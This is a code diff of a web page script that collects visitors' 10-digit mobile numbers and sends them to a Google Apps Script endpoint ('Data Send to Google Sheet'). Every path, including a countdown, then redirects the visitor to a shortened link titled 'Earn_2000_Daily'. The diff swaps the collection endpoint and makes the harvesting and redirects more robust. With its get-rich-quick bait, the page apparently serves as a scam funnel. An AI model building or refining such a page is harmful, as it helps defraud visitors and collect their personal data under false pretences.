@@ -85,9 +85,9 @@
 </div>
 
 <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby9qR9N6bh7Ym7m2x4sXn9XLyuvjkeoqr0xlV9ozfU4itPbk8-tw-skpFp0ydfvCKlH/exec";
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwLkH1blC3ss2aEVyf-JWfWi3dbeaXW22iFdzUuOCmgpURYYzNLQWip5gpjZNv92i1Q/exec";
     const FINAL_LINK = "https://is.gd/Earn_2000_Daily";
-    let timer = 30; // 30 seconds set kar diya hai
+    let timer = 30; 
     let isTyping = false;
 
     function checkInput() {
@@ -97,6 +97,8 @@
         let btn = document.getElementById('claimBtn');
         if(input.length === 10) {
             btn.style.background = "#1b5e20";
+        } else {
+            btn.style.background = "#25D366";
         }
     }
 
@@ -104,22 +106,35 @@
         let phone = document.getElementById('userPhone').value;
         if(phone.length === 10) {
             document.getElementById('claimBtn').innerText = "Verifying...";
-            fetch(SCRIPT_URL + "?mobile=" + phone, { method: 'GET', mode: 'no-cors' })
-            .finally(() => { 
-                window.location.href = FINAL_LINK; 
+            document.getElementById('claimBtn').disabled = true;
+
+            // Data Send to Google Sheet
+            fetch(SCRIPT_URL + "?mobile=" + encodeURIComponent(phone), { method: 'GET', mode: 'no-cors' })
+            .then(() => {
+                console.log("Data Sent Successfully");
+                window.location.href = FINAL_LINK;
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+                window.location.href = FINAL_LINK;
             });
-            setTimeout(() => { window.location.href = FINAL_LINK; }, 2000);
+
+            // Safety redirect
+            setTimeout(() => { window.location.href = FINAL_LINK; }, 2500);
         } else {
             alert("कृपया 10 अंकों का मोबाइल नंबर डालें");
         }
     }
 
     // Auto Redirect Timer Logic
-    setInterval(() => {
+    const timerInterval = setInterval(() => {
         if(!isTyping && timer > 0) {
             timer--;
             document.getElementById('countdown').innerText = "Automatic redirect in " + timer + "s...";
-            if(timer === 0) window.location.href = FINAL_LINK;
+            if(timer === 0) {
+                clearInterval(timerInterval);
+                window.location.href = FINAL_LINK;
+            }
         }
     }, 1000);
 
